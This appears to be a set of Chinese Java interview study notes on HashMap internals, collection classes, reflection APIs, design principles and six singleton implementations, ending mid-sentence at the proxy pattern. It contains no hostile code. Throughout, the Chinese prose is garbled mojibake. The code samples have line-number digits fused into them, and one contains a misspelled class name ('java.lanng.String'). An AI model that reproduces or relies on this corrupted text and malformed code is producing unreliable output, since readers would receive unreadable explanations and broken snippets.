Javaå¹¶å‘åŒ…ä¸­çš„, æ—¢æ˜¯çº¿ç¨‹å®‰å…¨çš„, åˆä¸è‡³äºæ•ˆç‡è¿‡ä½ æ€ä¹ˆå®ç°: åˆ†æ®µé”æœºåˆ¶ åˆ†æ®µé”: åªåŠ è½½åœ¨æŸä¸€æ®µæ•°æ®ä¸Š MySql: æŸ¥è¯¢ - 95%, å¢åˆ æ”¹ - 5% è¯»é”: å…±äº«é”, ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œæ“ä½œçš„æ—¶å€™ä¸åº”å¸çº³å¦ä¸€ä¸ªçº¿ç¨‹çš„ç»“æ„ å†™é”: æ’å®ƒé”, ä¸€ä¸ªçº¿ç¨‹åœ¨è¿›è¡Œæ“ä½œçš„æ—¶å€™ä¸å…è®¸å…¶ä»–ä»»ä½•çº¿ç¨‹çš„æ“ä½œ 3. put &amp; get çš„æµç¨‹put çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š é€šè¿‡ hashcode æ–¹æ³•è®¡ç®—å‡º key çš„ hash å€¼ é€šè¿‡ hash%length è®¡ç®—å‡ºå­˜å‚¨åœ¨ table ä¸­çš„ indexï¼ˆæºç ä¸­æ˜¯ä½¿ç”¨ hash&amp;(length-1)ï¼Œè¿™æ ·ç»“ æœç›¸åŒï¼Œä½†æ˜¯æ›´å¿«ï¼‰ å¦‚æœæ­¤æ—¶ table[index]çš„å€¼ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ç›´æ¥å­˜å‚¨ï¼Œå¦‚æœä¸ä¸ºç©ºé‚£ä¹ˆå°±é“¾æ¥åˆ°è¿™ä¸ªæ•°æ‰€åœ¨ çš„é“¾è¡¨çš„å¤´éƒ¨ã€‚ï¼ˆåœ¨ JDK1.8 ä¸­ï¼Œå¦‚æœé“¾è¡¨é•¿åº¦å¤§äº 8 å°±è½¬åŒ–æˆçº¢é»‘æ ‘ï¼‰ get çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š é€šè¿‡ hashcode è®¡ç®—å‡º key çš„ hash å€¼ é€šè¿‡ hash%length è®¡ç®—å‡ºå­˜å‚¨åœ¨ table ä¸­çš„ indexï¼ˆæºç ä¸­æ˜¯ä½¿ç”¨ hash&amp;(length-1)ï¼Œè¿™æ ·ç»“ æœç›¸åŒï¼Œä½†æ˜¯æ›´å¿«ï¼‰ éå† table[index]æ‰€åœ¨çš„é“¾è¡¨ï¼Œåªæœ‰å½“ key ä¸è¯¥èŠ‚ç‚¹ä¸­çš„ key çš„å€¼ç›¸åŒæ—¶æ‰å–å‡ºã€‚ 1.3 æŒæ¡é‡ç‚¹List: ArrayList, LinkList Set: HashSet, TreeSet éœ€è¦æŒæ¡çš„æ–¹æ³•: add , get, contains Map: HashMap, TreeMap éœ€è¦æŒæ¡çš„æ–¹æ³•: put get mapçš„å¾ªç¯éå† containsKeyâ€¦. ä»¥ä¸Šçš„éƒ½éœ€è¦è·Ÿä¸‹æºç  1.4 åŠŸèƒ½æ–¹æ³•1.4.1 List çš„åŠŸèƒ½æ–¹æ³•ArrayList: ç”±æ•°ç»„å®ç°çš„ Listã€‚å…è®¸å¯¹å…ƒç´ è¿›è¡Œå¿«é€Ÿéšæœºè®¿é—®ï¼Œä½†æ˜¯å‘ List ä¸­é—´æ’å…¥ä¸ç§» é™¤å…ƒç´ çš„é€Ÿåº¦å¾ˆæ…¢ã€‚ListIterator åªåº”è¯¥ç”¨æ¥ç”±åå‘å‰éå† ArrayListï¼Œè€Œä¸æ˜¯ç”¨æ¥æ’å…¥å’Œç§»é™¤ å…ƒç´ ã€‚å› ä¸ºé‚£æ¯” LinkedList å¼€é”€è¦å¤§å¾ˆå¤šã€‚ LinkedList : å¯¹é¡ºåºè®¿é—®è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå‘ List ä¸­é—´æ’å…¥ä¸åˆ é™¤çš„å¼€é”€å¹¶ä¸å¤§ã€‚éšæœºè®¿é—®åˆ™ ç›¸å¯¹è¾ƒæ…¢ã€‚(ä½¿ç”¨ ArrayList ä»£æ›¿ã€‚)è¿˜å…·æœ‰ä¸‹åˆ—æ–¹ æ³•ï¼šaddFirst(), addLast(), getFirst(), getLast(), removeFirst() å’Œ removeLast(), è¿™äº›æ–¹æ³• (æ²¡æœ‰åœ¨ä»»ä½•æ¥å£æˆ–åŸºç±»ä¸­å®šä¹‰è¿‡)ä½¿å¾— LinkedList å¯ä»¥å½“ä½œå †æ ˆã€é˜Ÿåˆ—å’ŒåŒå‘é˜Ÿåˆ—ä½¿ç”¨ã€‚ 1.4.2 Setçš„åŠŸèƒ½æ–¹æ³•Set : å­˜å…¥ Set çš„æ¯ä¸ªå…ƒç´ éƒ½å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå› ä¸º Set ä¸ä¿å­˜é‡å¤å…ƒç´ ã€‚åŠ å…¥ Set çš„å…ƒç´  å¿…é¡»å®šä¹‰ equals()æ–¹æ³•ä»¥ç¡®ä¿å¯¹è±¡çš„å”¯ä¸€æ€§ã€‚Set ä¸ Collection æœ‰å®Œå…¨ä¸€æ ·çš„æ¥å£ã€‚Set æ¥å£ ä¸ä¿è¯ç»´æŠ¤å…ƒç´ çš„æ¬¡åºã€‚ HashSet : ä¸ºå¿«é€ŸæŸ¥æ‰¾è®¾è®¡çš„ Setã€‚å­˜å…¥ HashSet çš„å¯¹è±¡å¿…é¡»å®šä¹‰ hashCode()ã€‚ TreeSet : ä¿å­˜æ¬¡åºçš„ Setï¼Œåº•å±‚ä¸ºæ ‘ç»“æ„ã€‚ä½¿ç”¨å®ƒå¯ä»¥ä» Set ä¸­æå–æœ‰åºçš„åºåˆ—ã€‚ LinkedHashSet : å…·æœ‰ HashSet çš„æŸ¥è¯¢é€Ÿåº¦ï¼Œä¸”å†…éƒ¨ä½¿ç”¨é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„é¡ºåº(æ’å…¥çš„æ¬¡ åº ã€‚äºæ˜¯åœ¨ä½¿ç”¨è¿­ä»£å™¨éå† Set æ—¶ï¼Œç»“æœä¼šæŒ‰å…ƒç´ æ’å…¥çš„æ¬¡åºæ˜¾ç¤ºã€‚ 1.4.3 Map çš„åŠŸèƒ½æ–¹æ³•Map : ç»´æŠ¤â€œé”®å€¼å¯¹â€çš„å…³è”æ€§ï¼Œä½¿ä½ å¯ä»¥é€šè¿‡â€œé”®â€æŸ¥æ‰¾â€œå€¼â€ HashMap : Map åŸºäºæ•£åˆ—è¡¨çš„å®ç°ã€‚æ’å…¥å’ŒæŸ¥è¯¢â€œé”®å€¼å¯¹â€çš„å¼€é”€æ˜¯å›ºå®šçš„ã€‚å¯ä»¥é€šè¿‡ æ„é€ å™¨è®¾ç½®å®¹é‡ capacity å’Œè´Ÿè½½å› å­ load factorï¼Œä»¥è°ƒæ•´å®¹å™¨çš„æ€§èƒ½ã€‚ LinkedHashMap : ç±»ä¼¼äº HashMapï¼Œä½†æ˜¯è¿­ä»£éå†å®ƒæ—¶ï¼Œå–å¾—â€œé”®å€¼å¯¹â€çš„é¡ºåºæ˜¯å…¶æ’ å…¥æ¬¡åºï¼Œæˆ–è€…æ˜¯æœ€è¿‘æœ€å°‘ä½¿ç”¨(LRU)çš„æ¬¡åºã€‚åªæ¯” HashMap æ…¢ä¸€ç‚¹ã€‚è€Œåœ¨è¿­ä»£è®¿é—®æ—¶å‘è€Œæ›´ å¿«ï¼Œå› ä¸ºå®ƒä½¿ç”¨é“¾è¡¨ç»´æŠ¤å†…éƒ¨æ¬¡åºã€‚ TreeMap : åŸºäºçº¢é»‘æ ‘æ•°æ®ç»“æ„çš„å®ç°ã€‚æŸ¥çœ‹â€œé”®â€æˆ–â€œé”®å€¼å¯¹â€æ—¶ï¼Œå®ƒä»¬ä¼šè¢«æ’åº(æ¬¡ åºç”± Comparabel æˆ– Comparator å†³å®š)ã€‚TreeMap çš„ç‰¹ç‚¹åœ¨ äºï¼Œä½ å¾—åˆ°çš„ç»“æœæ˜¯ç»è¿‡æ’åºçš„ã€‚ TreeMap æ˜¯å”¯ä¸€çš„å¸¦æœ‰ subMap()æ–¹æ³•çš„ Mapï¼Œå®ƒå¯ä»¥è¿”å›ä¸€ä¸ªå­æ ‘ã€‚ WeakHashMap : å¼±é”®(weak key)Mapï¼ŒMap ä¸­ä½¿ç”¨çš„å¯¹è±¡ä¹Ÿè¢«å…è®¸é‡Šæ”¾: è¿™æ˜¯ä¸ºè§£å†³ç‰¹ æ®Šé—®é¢˜è®¾è®¡çš„ã€‚å¦‚æœæ²¡æœ‰ map ä¹‹å¤–çš„å¼•ç”¨æŒ‡å‘æŸä¸ªâ€œé”®â€ï¼Œåˆ™æ­¤â€œé”®â€å¯ä»¥è¢«åƒåœ¾æ”¶é›†å™¨å› æ”¶ã€‚ IdentifyHashMap : ä½¿ç”¨==ä»£æ›¿ equals()å¯¹â€œé”®â€ä½œæ¯”è¾ƒçš„ hash mapã€‚ä¸“ä¸ºè§£å†³ç‰¹æ®Šé—®é¢˜ è€Œè®¾è®¡ã€‚ 2ã€åå°„2.1 åå°„åå°„: å°† Java ç±»ä¸­çš„å„ä¸ªæˆåˆ† (å±æ€§, æ–¹æ³•, æ„é€ æ–¹æ³•) æ˜ å°„æˆå¯¹åº”çš„ç±» åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ‰€å±çš„ç±» Classã€‚ åœ¨è¿è¡Œæ—¶åˆ¤æ–­æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ Constructorã€‚ åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡ Field å’Œæ–¹æ³• Methodã€‚ åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚method.invoke(object, args) åå°„çš„å¥½å¤„ æé«˜äº†æ•´ä¸ªä»£ç çš„çµæ´»æ€§ ä¸éœ€è¦çŸ¥é“ç»†èŠ‚ åå°„ç”¨çš„æœ€å¤šçš„æ—¶å€™, å°±æ˜¯å†™æ¡†æ¶çš„æ—¶å€™ åå°„ä¸­éœ€è¦æŒæ¡3ä¸ªç±»: Constructor: æ„é€ å™¨çš„æè¿°ç±» Field: å±æ€§çš„æè¿°ç±» Method: æ–¹æ³•çš„æè¿°ç±» Java é¢„å®šä¹‰ç±»å‹ æ˜¯å¦æ˜¯é¢„å®šä¹‰ç±»å‹: isPromitive(), 8ç§åŸºæœ¬æ•°æ®ç±»å‹ + void éƒ½æ˜¯é¢„å®šä¹‰ç±»å‹ å¼•ç”¨ç±»å‹, åŒ…è£…ç±»ä¸æ˜¯é¢„å®šä¹‰ç±»å‹. 12System.out.println(int.class.isPrimitive()); // trueSystem.out.println(Integer.class.isPrimitive()); // false 2.2 ClassClass : ç”¨äºæè¿°æ‰€æœ‰ç±»çš„ç±», Class ç±»æè¿°äº†ç±»çš„å±æ€§ä¿¡æ¯ï¼Œå¦‚ç±»åã€è®¿é—®æƒé™ã€åŒ…åã€å­— æ®µåç§°åˆ—è¡¨ã€æ–¹æ³•åç§°åˆ—è¡¨ç­‰, Classå°±æ˜¯åå°„çš„åŸºç¡€. è·å–Classçš„3ç§æ–¹å¼ 1. `Class.forName`(&quot;ç±»åå­—ç¬¦ä¸²&quot;) (æ³¨æ„ï¼šç±»åå­—ç¬¦ä¸²å¿…é¡»æ˜¯å…¨ç§°ï¼ŒåŒ…å+ç±»å) - å¦‚æœ `.class`å·²ç»è¢«åŠ è½½åˆ°å†…å­˜äº†, ç›´æ¥è¿”å› - å¦‚æœæ²¡æœ‰çš„è¯, å°±å…ˆåŠ è½½åˆ°å†…å­˜ 2. `ç±»å.class` 3. `å®ä¾‹å¯¹è±¡.getClass()` 2.3 Constructor1234567891011121314151617181920212223242526// API// è¡¥å……: å¯å˜å‚æ•° Class&lt;?&gt;... parameterTypespublic Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) &#123;&#125;public Constructor&lt;?&gt;[] getConstructors() throws SecurityException &#123;&#125; ================//ä½¿ç”¨=============================////////è·å–æ„é€ æ–¹æ³•//////////// è·å–æŸä¸ªç±»çš„æ‰€æœ‰æ„é€ æ–¹æ³•ï¼šConstructor[] constructor = Class.forName("java.lang.String").getConstructors();// è·å–æŸä¸ªç‰¹æ®Šï¼ˆç‰¹å®šå‚æ•°ï¼‰çš„æ„é€ æ–¹æ³•ï¼šConstructor constructor = Class.forName("java.lang.String").getConstructor(StringBuffer.class);////////åˆ›å»ºå®ä¾‹å¯¹è±¡//////////// é€šå¸¸æ–¹å¼ï¼Œç›´æ¥è°ƒç”¨æ„é€ æ–¹æ³•ï¼šString str = new String("huangbo");// åå°„æ–¹å¼ï¼šè°ƒç”¨å®å‚æ„é€ String str = (String)constructor.newInstance(new StringBuffer("huangbo"));// åå°„æ–¹å¼ï¼šè°ƒç”¨ç©ºå‚æ„é€ String obj = (String)Class.forName("java.lanng.String").newInstance();åªæœ‰ä¸¤ä¸ªç±»æ‹¥æœ‰ newInstance()æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ Class ç±»å’Œ Constructor ç±» Class ç±»ä¸­çš„ newInstance() æ–¹æ³•æ˜¯ä¸å¸¦å‚æ•°çš„ï¼ŒConstructor ç±»ä¸­çš„ newInstance()æ–¹æ³•æ˜¯å¸¦å‚æ•°çš„(Object)ï¼Œéœ€è¦æä¾› å¿…è¦çš„å‚æ•° 2.4 FieldFieldç±»ä»£è¡¨æŸä¸ªç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œè®¾æœ‰ä¸€ä¸ª obj å¯¹è±¡ï¼ŒField å¯¹è±¡ä¸æ˜¯ obj å…·ä½“çš„å˜é‡å€¼ï¼Œ è€Œæ˜¯æŒ‡ä»£çš„æ˜¯ obj æ‰€å±ç±»çš„å“ªä¸€ä¸ªå˜é‡ï¼Œå¯ä»¥é€šè¿‡ Field(å¯¹è±¡).get(obj)è·å–ç›¸åº”çš„å˜é‡å€¼ 123456789101112131415// APIpublic Field[] getFields() throws SecurityException &#123;&#125;public Field getField(String name) &#123;&#125;================//ä½¿ç”¨=============================// getField æ–¹æ³•åªèƒ½è·å–å£°æ˜ä¸º public çš„å˜é‡ï¼Œå¯¹äºç§æœ‰å˜é‡ï¼Œå¯ä»¥é€šè¿‡ getDeclaredField()æ–¹æ³•è· å– private å˜é‡Field field = obj.getClass().getDeclaredField();// å°† private å˜é‡è®¾ç½®ä¸ºå¯è®¿é—®ï¼›ç»§æ‰¿è‡ªçˆ¶ç±»AccessibleObject çš„æ–¹æ³•æ‰å¯è·å–å˜é‡å€¼field.setAccessible(true); // è·å¾—å¯¹è±¡å€¼, ä¼ å…¥å¯¹è±¡field.get(obj); // åå°„æ›¿æ¢,è®¾ç½®å¯¹è±¡å€¼// ä¼ å…¥å¯¹è±¡,å€¼// æŠŠ obj å¯¹è±¡çš„ field å±æ€§çš„å€¼æ›¿æ¢ä¸º newValuefield.set(obj,newValue) 2.5 MethodMethod ç±»ä»£è¡¨æŸä¸ªç±»ä¸­çš„æˆå‘˜æ–¹æ³• Method å¯¹è±¡ä¸æ˜¯å…·ä½“çš„æ–¹æ³•ï¼Œè€Œæ˜¯æ¥ä»£è¡¨ç±»ä¸­å“ªä¸€ä¸ªæ–¹æ³•ï¼Œä¸å¯¹è±¡æ— å…³ 123456789101112// è·å–: å¾—åˆ°ç±»ä¸­æŸä¸€ä¸ªæ–¹æ³•ï¼šMethod methodCharAt = Class.forName("java.lang.String").getMethod("charAt",int.class)// getMethod æ–¹æ³•ç”¨äºå¾—åˆ°ä¸€ä¸ªæ–¹æ³•å¯¹è±¡ï¼Œè¯¥æ–¹æ³•æ¥å—çš„å‚æ•°é¦–å…ˆè¦æœ‰è¯¥æ–¹æ³•åï¼ˆString ç±»å‹ï¼‰ï¼Œ// ç„¶åé€šè¿‡å‚æ•°åˆ—è¡¨æ¥åŒºåˆ†é‡è½½é‚£ä¸ªæ–¹æ³•ï¼Œå‚æ•°ç±»å‹ç”¨ Class å¯¹è±¡æ¥è¡¨ç¤º(å¦‚ä¸º int å°±ç”¨ int.class) // è°ƒç”¨æ–¹æ³•ï¼š//æ™®é€šæ–¹å¼ï¼šstr.charAt(1)//åå°„æ–¹å¼ï¼šmethodCharAt.invoke(str,1)// ä»¥ä¸Šä¸¤ç§è°ƒç”¨æ–¹å¼ç­‰ä»· 3. è®¾è®¡æ¨¡å¼è®¾è®¡æ¨¡å¼ï¼ˆDesign patternï¼‰ä»£è¡¨äº†é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­æœ€ä½³çš„å®è·µï¼Œé€šå¸¸è¢«æœ‰ç»éªŒçš„é¢å‘å¯¹è±¡çš„ è½¯ä»¶å¼€å‘äººå‘˜æ‰€é‡‡ç”¨ã€‚è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹ æ¡ˆã€‚è¿™äº›è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„ã€‚ è®¾è®¡æ¨¡å¼åªä¸è¿‡é’ˆå¯¹æŸäº›å…·ä½“åœºæ™¯æä¾›äº†ä¸€äº›æ•ˆç‡è¾ƒé«˜çš„ä»¥å¤æ‚åº¦æ¢çµæ´»æ€§çš„æ‰‹æ®µè€Œå·² æ¨èå­¦ä¹ ç«™ç‚¹ 3.1 è®¾è®¡æ¨¡å¼ â€“ å…­å¤§åŸåˆ™æ€»åŸåˆ™ï¼šå¼€é—­åŸåˆ™ï¼ˆOpen Close Principleï¼‰ å¼€é—­åŸåˆ™å°±æ˜¯è¯´å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚åœ¨ç¨‹åºéœ€è¦è¿›è¡Œæ‹“å±•çš„æ—¶å€™ï¼Œä¸èƒ½å»ä¿®æ”¹åŸæœ‰çš„ ä»£ç ï¼Œè€Œæ˜¯è¦æ‰©å±•åŸæœ‰ä»£ç ï¼Œå®ç°ä¸€ä¸ªçƒ­æ’æ‹”çš„æ•ˆæœã€‚æ‰€ä»¥ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ï¼šä¸ºäº†ä½¿ç¨‹åºçš„ æ‰©å±•æ€§å¥½ï¼Œæ˜“äºç»´æŠ¤å’Œå‡çº§ã€‚æƒ³è¦è¾¾åˆ°è¿™æ ·çš„æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¥å£å’ŒæŠ½è±¡ç±»ç­‰ï¼Œåé¢çš„ å…·ä½“è®¾è®¡ä¸­æˆ‘ä»¬ä¼šæåˆ°è¿™ç‚¹ã€‚ å…­å¤§åŸåˆ™ï¼š å•ä¸€èŒè´£åŸåˆ™ ä¸è¦å­˜åœ¨å¤šäºä¸€ä¸ªå¯¼è‡´ç±»å˜æ›´çš„åŸå› ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªç±»åº”è¯¥å®ç°å•ä¸€çš„èŒè´£ï¼Œå¦‚è‹¥ä¸ç„¶ï¼Œå°± åº”è¯¥æŠŠç±»æ‹†åˆ†ã€‚ é‡Œæ°æ›¿æ¢åŸåˆ™ï¼ˆLiskov Substitution Principleï¼‰ é‡Œæ°æ›¿æ¢åŸåˆ™ä¸­ï¼Œå­ç±»å¯¹çˆ¶ç±»çš„æ–¹æ³•å°½é‡ä¸è¦é‡å†™å’Œé‡è½½ã€‚å› ä¸ºçˆ¶ç±»ä»£è¡¨äº†å®šä¹‰å¥½çš„ç»“æ„ï¼Œé€šè¿‡è¿™ä¸ªè§„èŒƒçš„æ¥å£ä¸å¤–ç•Œäº¤äº’ï¼Œå­ç±»ä¸åº”è¯¥éšä¾¿ç ´åå®ƒã€‚ ä¾èµ–å€’è½¬åŸåˆ™ï¼ˆDependence Inversion Principleï¼‰ è¿™ä¸ªæ˜¯å¼€é—­åŸåˆ™çš„åŸºç¡€ï¼Œå…·ä½“å†…å®¹ï¼šé¢å‘æ¥å£ç¼–ç¨‹ï¼Œä¾èµ–äºæŠ½è±¡è€Œä¸ä¾èµ–äºå…·ä½“ã€‚å†™ä»£ç  æ—¶ç”¨åˆ°å…·ä½“ç±»æ—¶ï¼Œä¸ä¸å…·ä½“ç±»äº¤äº’ï¼Œè€Œä¸å…·ä½“ç±»çš„ä¸Šå±‚æ¥å£äº¤äº’ã€‚ æ¥å£éš”ç¦»åŸåˆ™ï¼ˆInterface Segregation Principleï¼‰ è¿™ä¸ªåŸåˆ™çš„æ„æ€æ˜¯ï¼šæ¯ä¸ªæ¥å£ä¸­ä¸å­˜åœ¨å­ç±»ç”¨ä¸åˆ°å´å¿…é¡»å®ç°çš„æ–¹æ³•ï¼Œå¦‚æœä¸ç„¶ï¼Œå°±è¦å°† æ¥å£æ‹†åˆ†ã€‚ä½¿ç”¨å¤šä¸ªéš”ç¦»çš„æ¥å£ï¼Œæ¯”ä½¿ç”¨å•ä¸ªæ¥å£ï¼ˆå¤šä¸ªæ¥å£æ–¹æ³•é›†åˆåˆ°ä¸€ä¸ªçš„æ¥å£ï¼‰è¦å¥½ã€‚ è¿ªç±³ç‰¹æ³•åˆ™ï¼ˆæœ€å°‘çŸ¥é“åŸåˆ™ï¼‰ï¼ˆDemeter Principleï¼‰ å°±æ˜¯è¯´ï¼šä¸€ä¸ªç±»å¯¹è‡ªå·±ä¾èµ–çš„ç±»çŸ¥é“çš„è¶Šå°‘è¶Šå¥½ ã€‚ä¹Ÿå°±æ˜¯è¯´æ— è®ºè¢«ä¾èµ–çš„ç±»å¤šä¹ˆå¤æ‚ï¼Œéƒ½ åº”è¯¥å°†é€»è¾‘å°è£…åœ¨æ–¹æ³•çš„å†…éƒ¨ï¼Œé€šè¿‡ public æ–¹æ³•æä¾›ç»™å¤–éƒ¨ã€‚è¿™æ ·å½“è¢«ä¾èµ–çš„ç±»å˜åŒ–æ—¶ï¼Œæ‰ èƒ½æœ€å°çš„å½±å“è¯¥ç±»ã€‚ åˆæˆå¤ç”¨åŸåˆ™ï¼ˆComposite Reuse Principleï¼‰ åŸåˆ™æ˜¯å°½é‡é¦–å…ˆä½¿ç”¨åˆæˆ/èšåˆçš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»§æ‰¿ã€‚ 3.2 è®¾è®¡æ¨¡å¼ â€“ åˆ†ç±»æ€»ä½“æ¥è¯´è®¾è®¡æ¨¡å¼åˆ†ä¸ºä¸‰å¤§ç±»ï¼š åˆ›å»ºå‹æ¨¡å¼ï¼Œå…±äº”ç§ï¼šå·¥å‚æ–¹æ³•æ¨¡å¼ã€æŠ½è±¡å·¥å‚æ¨¡å¼ã€å•ä¾‹æ¨¡å¼ã€å»ºé€ è€…æ¨¡å¼ã€åŸå‹æ¨¡å¼ã€‚ ç»“æ„å‹æ¨¡å¼ï¼Œå…±ä¸ƒç§ï¼šé€‚é…å™¨æ¨¡å¼ã€è£…é¥°å™¨æ¨¡å¼ã€ä»£ç†æ¨¡å¼ã€å¤–è§‚æ¨¡å¼ã€æ¡¥æ¥æ¨¡å¼ã€ç»„åˆ æ¨¡å¼ã€äº«å…ƒæ¨¡å¼ã€‚ è¡Œä¸ºå‹æ¨¡å¼ï¼Œå…±åä¸€ç§ï¼šç­–ç•¥æ¨¡å¼ã€æ¨¡æ¿æ–¹æ³•æ¨¡å¼ã€è§‚å¯Ÿè€…æ¨¡å¼ã€è¿­ä»£å­æ¨¡å¼ã€è´£ä»»é“¾æ¨¡ å¼ã€å‘½ä»¤æ¨¡å¼ã€å¤‡å¿˜å½•æ¨¡å¼ã€çŠ¶æ€æ¨¡å¼ã€è®¿é—®è€…æ¨¡å¼ã€ä¸­ä»‹è€…æ¨¡å¼ã€è§£é‡Šå™¨æ¨¡å¼ã€‚ 3.3 å¸¸è§è®¾è®¡æ¨¡å¼3.3.1 å•ä¾‹æ¨¡å¼(æ‰‹å†™)å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰æ˜¯ Java ä¸­æœ€ç®€å•çš„,ä¹Ÿæ˜¯æœ€æœ€æœ€å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ã€‚è¿™ç§ç±» å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚ æ³¨æ„: å•ä¾‹ç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ã€‚ å•ä¾‹ç±»å¿…é¡»è‡ªå·±åˆ›å»ºè‡ªå·±çš„å”¯ä¸€å®ä¾‹ã€‚ å•ä¾‹ç±»å¿…é¡»ç»™æ‰€æœ‰å…¶ä»–å¯¹è±¡æä¾›è¿™ä¸€å®ä¾‹ã€‚ å…±æœ‰å…­ç§å®ç°ï¼š 1ã€æ‡’æ±‰å¼ï¼Œçº¿ç¨‹ä¸å®‰å…¨ 1234567891011public class Singleton &#123; private static Singleton instance; private Singleton ()&#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125; &#125; 2ã€æ‡’æ±‰å¼ï¼Œçº¿ç¨‹å®‰å…¨ 12345678910public class Singleton &#123; private static Singleton instance; private Singleton ()&#123;&#125; public static synchronized Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125; &#125; 3ã€é¥¿æ±‰å¼ 1234567public class Singleton &#123; private static Singleton instance = new Singleton(); private Singleton ()&#123;&#125; public static Singleton getInstance() &#123; return instance; &#125; &#125; 4ã€åŒæ£€é”/åŒé‡æ ¡éªŒé”ï¼ˆDCLï¼Œå³ double-checked lockingï¼‰ â€“é¢è¯•å¿…å¤‡ 1234567891011121314public class Singleton &#123; private volatile static Singleton singleton; private Singleton ()&#123;&#125; public static Singleton getSingleton() &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125; &#125; 5ã€ç™»è®°å¼/é™æ€å†…éƒ¨ç±» 123456789public class Singleton &#123; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; private Singleton ()&#123;&#125; public static final Singleton getInstance() &#123; return SingletonHolder.INSTANCE; &#125; &#125; 6ã€æšä¸¾ 12345public enum Singleton &#123; INSTANCE; public void whateverMethod() &#123; &#125; &#125; è¯¦ç»†è¯·çœ‹ 3.3.2 è£…é¥°å™¨æ¨¡å¼(æ‰‹å†™)é¦–å…ˆçœ‹ä¸€æ®µä»£ç  ä»£ç åˆ†æ: æ„é€ ä¸€ä¸ªç¼“å†²çš„å­—ç¬¦è¾“å…¥æµã€‚åŒ…è£…äº†ä¸€ä¸ªæ–‡ä»¶å­—ç¬¦è¾“å…¥æµã€‚ äº‹å®ä¸Šï¼ŒBufferedReader å°±æ˜¯ç”¨æ¥å¢å¼º FileReader çš„è¯»å–çš„åŠŸèƒ½çš„ã€‚ FileReader åªæœ‰ read()æ–¹æ³•ï¼Œ ä½†æ˜¯ BufferedReader ä¸­å´å¢åŠ äº†ä¸€ä¸ª readLine()çš„é€è¡Œè¯»å– çš„åŠŸèƒ½ æ‰€ä»¥è¿™å°±ç›¸å½“äºæ˜¯ BufferedReader è£…é¥°äº† FileReaderï¼Œè®© FileReader å˜å¾—æ›´å¼ºå¤§ è£…é¥°å™¨æ¨¡å¼æ¦‚å¿µ è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰å…è®¸å‘ä¸€ä¸ªç°æœ‰çš„å¯¹è±¡æ·»åŠ æ–°çš„åŠŸèƒ½ï¼ŒåŒæ—¶åˆä¸æ”¹å˜å…¶ç»“ æ„ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒæ˜¯ä½œä¸ºç°æœ‰çš„ç±»çš„ä¸€ä¸ªåŒ…è£…ã€‚ è¿™ç§æ¨¡å¼åˆ›å»ºäº†ä¸€ä¸ªè£…é¥°ç±»ï¼Œç”¨æ¥åŒ…è£…åŸæœ‰çš„ç±»ï¼Œå¹¶åœ¨ä¿æŒç±»æ–¹æ³•ç­¾åå®Œæ•´æ€§çš„å‰æä¸‹ï¼Œ æä¾›äº†é¢å¤–çš„åŠŸèƒ½ã€‚ è£…é¥°å™¨æ¨¡å¼å®ç°æ–¹å¼1. å®šä¹‰åŒ…è£…ç±» 2. å°†è¦è£…é¥°çš„æ¨¡å¼ä½œä¸ºå‚æ•°ä¼ å…¥åŒ…è£…ç±» 3. å®ç°è¦åŠ å¼ºçš„æ–¹æ³• 3.3.2 ä»£ç†æ¨¡å¼1. é™æ€ä»£ç†é™æ€ä»£ç†çš„ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼šä¸€ä¸ªä»£ç†ç±»åªèƒ½å¯¹ä¸€ä¸ªä¸šåŠ¡æ¥å£çš„å®ç°ç±»è¿›è¡ŒåŒ…è£…ï¼Œå¦‚æœæœ‰å¤šä¸ªä¸š 